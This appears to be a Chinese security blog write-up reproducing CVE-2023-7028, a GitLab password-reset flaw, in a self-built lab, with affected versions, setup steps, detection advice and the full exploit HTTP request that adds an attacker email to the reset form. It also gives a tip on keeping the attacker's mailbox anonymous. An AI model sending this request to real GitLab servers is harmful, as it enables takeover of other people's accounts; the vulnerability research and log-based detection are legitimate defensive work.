#  【漏洞复现】Gitlab任意用户密码重置   
原创 Chris  溪琉安全录   2024-01-14 19:52  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/HeyvlDcgSI1GV2TF3pX09U50Jc9dVr4QiaJxKo6JpaPYsScKKSrfaRuyk3ibN7WosBFE9f2M0H4StiaBb4GXDK4IA/640?wx_fmt=gif "")  
  
****  
**0x01 前言**  
  
2024年1月，GitLab发布安全更新修复了一个任意用户密码重置漏洞，CVE编号为  
CVE-2023-7028，原因是  
在GitLab发布的16.1.0版本中引入了通过电子邮件找回密码的功能，已经注册的用户输入电子邮件会发送一个带有重置密码链接的邮件，攻击者可以通过构造恶意的数据包添加一个  
未验证的电子邮箱地址，同样可以收到重置密码的链接，达到重置密码的效果。  
  
**0x02 影响版本**  
  
  
16.1 <= GitLab CE/EE < 16.1.5  
  
16.2 <= GitLab CE/EE < 16.2.8  
  
16.3 <= GitLab CE/EE < 16.3.6  
  
16.4 <= GitLab CE/EE < 16.4.4  
  
16.5 <= GitLab CE/EE < 16.5.6  
  
16.6 <= GitLab CE/EE < 16.6.4  
  
16.7 <= GitLab CE/EE < 16.7.2  
  
该漏洞利用方式较为简单，触发条件为：  
  
1.gitlab使用了邮箱登录认证  
  
2.需要获得一个在Gitlab数据库中已经存在的邮箱，即Gitlab用户注册时候填的邮箱  
  
**0x03 环境搭建**  
  
****  
安装包从国内镜像站下载即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGEzcRSMibicUiavxgDdJoDTn0OSt9W7jCAMT3HhBhsNX79WYXbVVwyfLbA/640?wx_fmt=png&from=appmsg "")  
  
安装镜像和依赖  
```
yum localinstall gitlab-ce-16.1.1-ce.0.el7.x86_64.rpm  -y
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGcVhEfqV7Gq9Mibv0xcjOLTrvkzCDfLH0UBUCAysX5NuNvZz5u2OgFIw/640?wx_fmt=png&from=appmsg "")  
  
修改配置文件后，gitlab-ctl reconfigure 重新加载配置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWG3maHiaqGjjD61v0vaMA8U9X7jFzvjyHvPFYpaflEtT8JDmGXWfamHtQ/640?wx_fmt=png&from=appmsg "")  
  
gitlab-rails console进入控制台  
  
测试向外发送一封电子邮件，看邮件功能是否正常  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGASsu0OukqMSicO8MW2gB5tYec6NxLngfNuIERaSkpM0QNjsLOIOicfIA/640?wx_fmt=png&from=appmsg "")  
  
可以正常收到即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGu5uVO0JfOq4eB18GpoPBcOMsCHHFJmIv7Mf5FtYPJHbbQ3UKMUNYjg/640?wx_fmt=png&from=appmsg "")  
  
安装成功后会自动生成一个初始密码，24小时后第一次重新加载配置文件的时候失效  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGec5vuvnU8jJe2CqrSXrPawCAD92CU6Qn5Cc3VMZczS89oyJjvbsv3w/640?wx_fmt=png&from=appmsg "")  
  
到/etc/gitlab/initial_root_password查看密码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGmDGfVqEMIicXicxO4bul9JA7APFF4DzedFbrrc9FLbLeSD903ia0dUFVA/640?wx_fmt=png&from=appmsg "")  
  
使用root账户和上边的密码就可以进入后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWG2P30EtOVdHkGI0ianmy9xYjib7vWEPj4CX5icar2IRQDZq7nmW2iaP8aYw/640?wx_fmt=png&from=appmsg "")  
  
注册一个新用户来模拟已经存在的邮箱  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGico8IDBGLRZJOnjbrSdMynIZhIfq5KbhreliclTwQBxMV7jNiaRznhT4A/640?wx_fmt=png&from=appmsg "")  
  
注册成功后需要等待管理员批准  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWG68QREkmJgQrEeMqerf7iaT6NMkfFMvEgxELmwP0L6QO9V1HKMpenmfA/640?wx_fmt=png&from=appmsg "")  
  
批准通过，即可登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGicGQC8LuTEqveYfNqr9icIQ8yU3RMVpibVwFZ5Mv7QwBjBUSIBlMhzocg/640?wx_fmt=png&from=appmsg "")  
  
至此我们触发漏洞的环境就都搭配好了  
  
**0x04 漏洞利用**  
  
****  
这里我们把Gitlab配置的发件人邮箱简称为A@163.com，正常的Gitlab用户邮箱简称为B@163.com，攻击者的邮箱简称为C@163.com  
  
先看正常的找回密码的数据包，只有一个token和正常的找回密码收件邮箱，数据包构造为authenticity_token=&user[email]=B@163.com  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGwq9lVUkYNepadcN5t95zK3dsgqOFYpicjiclJYa1NvTdWUUXeTSnEkmQ/640?wx_fmt=png&from=appmsg "")  
  
该漏洞触发的时候只需要在后边添加一个攻击者邮箱即可，数据包格式为authenticity_token=&user[email][]=B@163.com&user[email][]=C@163.com  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGEtGuWqJaAXyc7DpoykJFncn4xLEpJeIGl8BFwtqQxU5iczdcjav4qvQ/640?wx_fmt=png&from=appmsg "")  
  
数据包如下  
```
POST /users/password HTTP/1.1
Host: xxx
Content-Length: 188
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://xxx
Content-Type: application/x-www-form-urlencoded
Referer: http://xxx/users/password/new
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

authenticity_token=xxxxx&user%5Bemail%5D%5B%5D=B@163.com&user%5Bemail%5D%5B%5D=C@163.com
```  
  
攻击者和失陷账户收到的邮件是一样的，都可以清楚的看到两个人的邮箱  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGMaF5xtWKl3lZGgIQ6zYKmn5ICrY60sAgDINHB9HoFQLhuCEA7TfrVA/640?wx_fmt=png&from=appmsg "")  
  
点击Reset password后进入重置密码界面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGxY4MDbqnmylK1mWqqZQqASozZZQ1EzHSxibCzqbwyBd3rUogCLSxFYQ/640?wx_fmt=png&from=appmsg "")  
  
****  
**0x05 总结**  
  
****  
1.整个漏洞的利用过程并非把重置密码的邮件劫持掉了，更像是群发了一份，因为收到的邮件可以看到都有谁收到了邮件。因此，正常业务中如果收到了重置密码的邮件并且收件人中不只有自己的邮箱，请赶紧修改密码并通知安全人员  
  
2.经测试，修改密码的链接点击进去修改一次之后就失效了，收件人谁点的快谁先生效  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGHicDmfuu2sIicLL8EDkaUZQy0cA7bTxhBBqMV74UkwRGz3yDLDl9soRQ/640?wx_fmt=png&from=appmsg "")  
  
3.authenticity_token并非登录之后的token，构造数据包前需要先到users/password/new接口获取下authenticity_token的值  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWGlKlF0ceNNiaeSpjFnuWRGNONmRPvDyU2cjMIicrDGvHJle23nrqe6sDw/640?wx_fmt=png&from=appmsg "")  
  
4.排查攻击的时候可以查看production_json.log日志文件，使用{"key":"user","value":{"email"(.*?)}}],"remote_ip":正则匹配到的邮箱，重点排查非Gitlab中注册用户的邮箱  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3Fs3Mgc8yAtQWqflX6oqWG7lAILuuzB0Py2yAKgb4Bet3Aucb4b74YRmccl3m6K1pVuQOfRyGicHQ/640?wx_fmt=png&from=appmsg "")  
  
5.由于该漏洞触发需要Gitlab数据库中存在的邮箱，公网绑定了域名的Gitlab需要提防邮箱泄漏的情况  
  
6.攻击者在攻击的时候需要考虑邮箱的匿名，收到邮件的尽量快一点重置密码  
  
**0x06 参考链接**********  
  
****  
  
https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released  
  
[https://mp.weixin.qq.com/s/qYjiUItKLHjlgl0PfofB4g](https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247492242&idx=1&sn=2834e0e0913bca6f7b777efbc00326a6&scene=21#wechat_redirect)  
  
  
https://blog.csdn.net/qq_44930876/article/details/129497509  
  
[https://mp.weixin.qq.com/s/i9EoGEgtWM6WkCz3Qro7fA](https://mp.weixin.qq.com/s?__biz=MzIwODc2NjgxNA==&mid=2247483963&idx=1&sn=8ca5d1fd9e5b437ec7bbed8db474e791&scene=21#wechat_redirect)  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HeyvlDcgSI3rptD5qOT8iaiawZtFPr4sjGVk5GcFroTSsRVPw5EF5GTyrtMbHiblyUFQrGLyG7511PlChxAKsly4Q/640?wx_fmt=png "")  
  
